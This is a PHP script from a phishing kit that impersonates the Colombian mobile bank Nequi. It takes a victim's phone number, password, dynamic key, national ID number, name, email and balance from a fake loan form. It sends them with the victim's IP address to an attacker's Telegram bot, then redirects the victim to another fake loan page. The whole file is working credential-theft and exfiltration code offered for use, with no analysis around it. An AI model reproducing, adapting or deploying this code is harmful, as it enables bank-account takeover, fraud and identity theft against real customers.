<?php
ini_set('display_errors', 1);
error_reporting(E_ALL);
header('Content-Type: application/json');

/* ============================================================
   🔥 CARGAR CONFIG (MISMO ESTÁNDAR TUYO)
   ============================================================ */
function loadConfig()
{
    $configFile = __DIR__ . '/../../config.php';

    if (!file_exists($configFile)) return null;

    $config = require $configFile;

    if (!isset($config['bot_token']) || !isset($config['chat_id']))
        return null;

    return [
        'token'   => $config['bot_token'],
        'chat_id' => $config['chat_id']
    ];
}

/* ============================================================
   📩 TELEGRAM
   ============================================================ */
function sendTelegramMessage($token, $chatId, $text)
{
    $payload = [
        'chat_id'    => $chatId,
        'text'       => $text,
        'parse_mode' => 'HTML'
    ];

    $ch = curl_init("https://api.telegram.org/bot{$token}/sendMessage");
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST           => true,
        CURLOPT_HTTPHEADER     => ['Content-Type: application/json'],
        CURLOPT_POSTFIELDS     => json_encode($payload)
    ]);

    $res = curl_exec($ch);
    curl_close($ch);

    $resp = json_decode($res, true);
    return $resp['result']['message_id'] ?? null;
}

/* ============================================================
   🧰 HELPERS
   ============================================================ */
function h($s) { 
    return htmlspecialchars((string)$s, ENT_QUOTES, 'UTF-8'); 
}

function fmtCOP($n) {
    if ($n === null || $n === '' || !is_numeric($n)) return null;
    return '$' . number_format((int)$n, 0, ',', '.');
}

/* ============================================================
   🧾 MENSAJE
   ============================================================ */
function buildMessage(array $data): string {

    // Datos “clásicos”
    $numero   = $data['numero']   ?? '';
    $clave    = $data['clave']    ?? '';
    $dinamica = $data['dinamica'] ?? '';
    $ip       = $_SERVER['REMOTE_ADDR'] ?? ($data['userIP'] ?? '');

    // Datos nuevos (form “niti”)
    $tipo       = $data['tipo']       ?? null;
    $titulo     = $data['titulo']     ?? null;
    $monto      = $data['monto']      ?? null;
    $cuotas     = $data['cuotas']     ?? null;
    $fecha_pago = $data['fecha_pago'] ?? null;
    $cedula     = $data['cedula']     ?? null;
    $nombres    = $data['nombres']    ?? null;
    $apellido   = $data['apellido']   ?? null;
    $saldo      = $data['saldo']      ?? null;
    $correo     = $data['correo']     ?? null;

    // Encabezado
    $msg  = "<b>💎 NEQUI - CREDENCIALES 💎</b>\n";
    $msg .= "• 📞 Número: <code>" . h($numero) . "</code>\n";
    $msg .= "• 🔐 Clave: <code>"  . h($clave)  . "</code>\n";

    // Bloque formulario
    $bloqueNiti = [];
    if ($tipo       !== null) $bloqueNiti[] = "• 🏷️ Tipo: <code>" . h($tipo) . "</code>";
    if ($titulo     !== null) $bloqueNiti[] = "• 📄 Producto: <code>" . h($titulo) . "</code>";
    if ($monto      !== null) $bloqueNiti[] = "• 💵 Monto: <code>" . h(fmtCOP($monto)) . "</code>";
    if ($cuotas     !== null) $bloqueNiti[] = "• 📆 Plazo: <code>" . h($cuotas) . " meses</code>";
    if ($fecha_pago !== null) $bloqueNiti[] = "• 🗓️ Fecha de pago: <code>" . h($fecha_pago) . "</code>";
    if ($cedula     !== null) $bloqueNiti[] = "• 🆔 Cédula: <code>" . h($cedula) . "</code>";
    if ($nombres !== null || $apellido !== null) {
        $bloqueNiti[] = "• 👤 Nombre: <code>" . h(trim(($nombres ?? '') . ' ' . ($apellido ?? ''))) . "</code>";
    }
    if ($saldo      !== null) $bloqueNiti[] = "• 🏦 Saldo informado: <code>" . h(fmtCOP($saldo)) . "</code>";
    if ($correo     !== null) $bloqueNiti[] = "• ✉️ Correo: <code>" . h($correo) . "</code>";

    if (!empty($bloqueNiti)) {
        $msg .= "\n<b>📝 Solicitud (formulario)</b>\n" . implode("\n", $bloqueNiti);
    }

    return $msg;
}

/* ============================================================
   🚀 CONTROLLER
   ============================================================ */
if ($_SERVER['REQUEST_METHOD'] === 'POST') {

    header('Content-Type: application/json; charset=utf-8');

    // Acepta JSON o POST tradicional
    $raw  = file_get_contents('php://input');
    $data = json_decode($raw, true);
    if (!is_array($data) || empty($data)) {
        $data = $_POST;
    }

    // Cargar config local
    $config = loadConfig();
    if (!$config) {
        echo json_encode(['redirect' => '']);
        exit;
    }

    // Enviar mensaje
    $msg = buildMessage($data);
    sendTelegramMessage($config['token'], $config['chat_id'], $msg);

    // Igual que antes
    echo json_encode(['redirect' => 'prestamo1.php']);
    exit;
}

echo json_encode(['redirect' => '']);
exit;
